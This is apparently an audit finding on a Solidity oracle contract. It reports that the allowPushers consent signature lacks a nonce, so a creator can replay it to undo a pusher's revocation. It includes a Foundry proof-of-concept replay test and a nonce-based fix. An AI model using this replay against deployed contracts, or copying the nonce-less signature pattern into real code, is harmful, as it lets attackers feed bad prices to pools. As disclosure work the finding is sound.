### Title
`allowPushers` consent signature has no nonce, allowing creator to replay it and permanently nullify a pusher's `revokePusher()` call within the deadline window — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` verifies a pusher's EIP-191 consent signature but includes no nonce in the signed message. Within the deadline window the creator can replay the identical signature bytes after the pusher has called `revokePusher()`, silently re-establishing the delegation. Because the pusher's pushes continue to land in the creator's namespace, any pool that reads the creator's feeds can receive prices the pusher no longer intends to publish there — including prices from a compromised key the pusher was trying to stop.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The tuple `(chainid, oracle, deadline, pusher, creator)` contains no nonce, no used-signature bitmap, and no per-pusher sequence counter. The only replay gate is `_ensureDeadline(deadline)`, which only rejects calls made **after** the deadline, not repeated calls **before** it. [2](#0-1) 

`revokePusher()` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But `allowPushers` unconditionally overwrites it with no check for a prior revocation:

```solidity
namespaceRemapping[pusher] = msg.sender;
``` [4](#0-3) 

The code's own NatSpec acknowledges the underlying concern — "an undated signature could re-establish a delegation AFTER the pusher revoked it" — and claims the deadline solves it. It does not: the deadline only prevents replay **after** it expires, not repeated replay **before** it expires. [5](#0-4) 

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [6](#0-5) 

So every push the pusher makes after the creator replays the delegation lands in the creator's namespace, not the pusher's own, and is immediately readable by any price provider or pool that queries `getOracleData` / `price` for the creator's feed IDs. [7](#0-6) 

---

### Impact Explanation

A pusher whose signing key is compromised (or who simply wants to stop feeding a creator's namespace) calls `revokePusher()`. The creator immediately replays the original consent bytes through `allowPushers` with the same `deadline` value. The delegation is restored in the same block. The pusher cannot stop this loop until the deadline timestamp passes. During that window every push the compromised key makes is written into the creator's namespace and is consumed by any pool that uses the creator's feeds as its price source. This satisfies the **bad-price execution** impact gate: a stale or attacker-controlled bid/ask quote reaches a live pool swap because the oracle namespace the pool reads has been kept open against the pusher's explicit revocation.

---

### Likelihood Explanation

The attack requires only that the creator retain the original `allowPushers` calldata (trivially available from mempool or chain history) and submit it again before the deadline. No special privilege, no off-chain coordination, and no additional funds are needed. Deadlines are typically set days in the future to accommodate operational latency, giving the creator a large replay window. Likelihood is **medium**: it requires a creator who acts against the pusher's interests, but the mechanism is fully permissionless once the original signature is on-chain.

---

### Recommendation

Add a per-pusher nonce to the signed message and increment it on every successful `allowPushers` call (or on every `revokePusher` call). The simplest fix:

```solidity
mapping(address => uint256) public pusherNonce;

// in allowPushers, replace the hash construction with:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]
    ))
);
// after successful recovery:
pusherNonce[pusher]++;
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, store a `usedSignatures` bitmap keyed on the signature hash and revert on reuse.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from
    "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokeBypassedBySignatureReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation set");

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — no new pusher consent needed
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // 5. Delegation is silently re-established; revokePusher() had no effect
        assertEq(
            oracle.namespaceRemapping(pusher),
            creator,
            "delegation re-established after revoke — revokePusher() bypassed"
        );
    }
}
```

The test passes without any revert, demonstrating that `revokePusher()` provides no protection within the deadline window. Any subsequent push from `pusher` lands in `creator`'s namespace and is immediately readable by pools via `getOracleData` / `price`.

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L163-178)
```text
    function price(bytes32 feedId, address /* pool */)
        external
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        return _price(feedId);
    }

    function _price(bytes32 feedId)
        internal
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        OracleData memory data = getOracleData(feedId);
        return (uint256(data.price), uint256(data.spread0), data.spread1, data.timestampMs.toSeconds());
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
